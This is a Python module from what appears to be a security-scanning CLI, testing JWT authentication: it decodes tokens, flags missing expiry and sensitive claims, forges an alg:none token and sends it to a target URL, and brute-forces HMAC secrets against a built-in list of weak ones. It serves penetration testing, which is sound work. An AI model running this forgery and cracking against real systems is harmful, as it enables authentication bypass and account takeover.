"""engines/security/jwt.py — JWT decode, alg:none attack, weak secret brute-force."""

import base64
import json
import hmac
import hashlib
import time
from core.module_base import BaseModule, Option
from core.utils       import color, info, success, warn, error, section
from core.validator   import require_url
from core.errors      import NetworkError

WEAK_SECRETS = [
    "secret","password","123456","admin","test","key","jwt_secret",
    "your-secret-key","supersecret","changeme","qwerty","letmein",
    "token","jwt","app_secret","hibiki","kizen","dswebteam","reconcli",
    "development","production","staging","default","none","null",
]


def _b64_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _decode_jwt(token: str) -> tuple:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header  = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        return header, payload, parts
    except Exception:
        return None, None, None

def _forge_none(parts: list) -> str:
    header        = json.loads(_b64_decode(parts[0]))
    header["alg"] = "none"
    new_hdr       = _b64_encode(json.dumps(header, separators=(",",":")).encode())
    return f"{new_hdr}.{parts[1]}."

def _try_secret(parts: list, secret: str) -> bool:
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return _b64_encode(sig) == parts[2]


class JWTTester(BaseModule):
    name        = "security/jwt"
    description = "Decode JWT, test alg:none attack, brute-force weak secrets"

    def __init__(self):
        self.options = {
            "TARGET": Option(required=True,  description="URL to test JWT endpoint"),
            "TOKEN":  Option(required=False, description="JWT token to analyze (optional)"),
        }
        super().__init__()

    def run(self):
        requests = self.need_package("requests")
        target   = require_url(self.opt("TARGET"))
        token    = (self.opt("TOKEN") or "").strip()

        if not token:
            token = input(color("\n  [>] Paste JWT token (or Enter to skip): ", "cyan")).strip()

        if not token:
            info("No token — scanning for JWT endpoints only.")
            self._scan_endpoints(requests, target)
            return

        header, payload, parts = _decode_jwt(token)
        if not header:
            error("Invalid JWT format — expected 3 base64 parts separated by dots.")
            return

        # ── Decode ────────────────────────────────────────────────
        section("Decoded Token")
        print(color("  HEADER:", "dark"))
        for k, v in header.items():
            print(color(f"    {k:<14}: ", "dark") + color(str(v), "cyan"))

        print(color("\n  PAYLOAD:", "dark"))
        for k, v in payload.items():
            print(color(f"    {k:<14}: ", "dark") + color(str(v), "cyan"))

        # ── Checks ────────────────────────────────────────────────
        section("Vulnerability Checks")

        alg = header.get("alg", "none")

        # 1. Algorithm
        if alg.lower() == "none":
            self.critical("alg:none — no signature, anyone can forge tokens")
        elif alg.upper().startswith("HS"):
            info(f"Algorithm: {alg} (symmetric — brute-forceable if secret is weak)")
        elif alg.upper().startswith("RS") or alg.upper().startswith("ES"):
            success(f"Algorithm: {alg} (asymmetric — stronger)")

        # 2. Expiry
        exp = payload.get("exp")
        if exp is None:
            self.critical("No exp (expiry) claim — token never expires!")
        else:
            remaining = exp - int(time.time())
            if remaining < 0:
                self.high("Token is expired — server should reject it",
                          f"Expired {abs(remaining)}s ago")
                warn(f"Token expired {abs(remaining)}s ago")
            else:
                success(f"Token expires in {remaining}s (~{remaining//3600}h)")
                self.note("Token expiry", f"{remaining}s remaining")

        # 3. Sensitive claims
        sensitive_keys = ["password","pwd","secret","key","card","ssn","credit"]
        leaked = [k for k in payload if any(s in k.lower() for s in sensitive_keys)]
        if leaked:
            self.high("Sensitive data in JWT payload", str(leaked))
            warn(f"Sensitive claims in payload: {leaked} — JWT is base64, NOT encrypted!")

        # 4. alg:none attack
        section("alg:none Attack")
        forged = _forge_none(parts)
        info(f"Forged token: {forged[:60]}...")
        result = self._test_token(requests, target, forged)
        if result == 200:
            self.critical("Server accepted forged alg:none token!", target)
        elif result:
            info(f"Server returned HTTP {result} for forged token (likely rejected)")

        # 5. Weak secret brute-force
        if alg.upper().startswith("HS"):
            section("Weak Secret Brute-force")
            info(f"Trying {len(WEAK_SECRETS)} common secrets...")
            cracked = next((s for s in WEAK_SECRETS if _try_secret(parts, s)), None)
            if cracked:
                self.critical(f"JWT secret cracked: '{cracked}'",
                              "Attacker can forge any token")
                error(f"Secret is: '{cracked}'")
            else:
                success("Secret not in common list.")

        print()

    def _test_token(self, requests, url: str, token: str) -> int | None:
        try:
            resp = requests.get(url, timeout=self._timeout,
                                headers={"Authorization": f"Bearer {token}",
                                         "User-Agent": "ReconCLI/3.0"})
            return resp.status_code
        except Exception:
            return None

    def _scan_endpoints(self, requests, base: str):
        """Look for JWT-protected endpoints."""
        section("JWT Endpoint Discovery")
        paths = ["api/me","api/user","api/profile","api/auth/verify","api/token/verify"]
        for path in paths:
            url = f"{base.rstrip('/')}/{path}"
            try:
                resp = requests.get(url, timeout=self._timeout)
                if resp.status_code == 401:
                    www = resp.headers.get("WWW-Authenticate","")
                    if "bearer" in www.lower():
                        info(f"JWT-protected: {url}")
                        self.note("JWT endpoint found", url)
            except Exception:
                pass
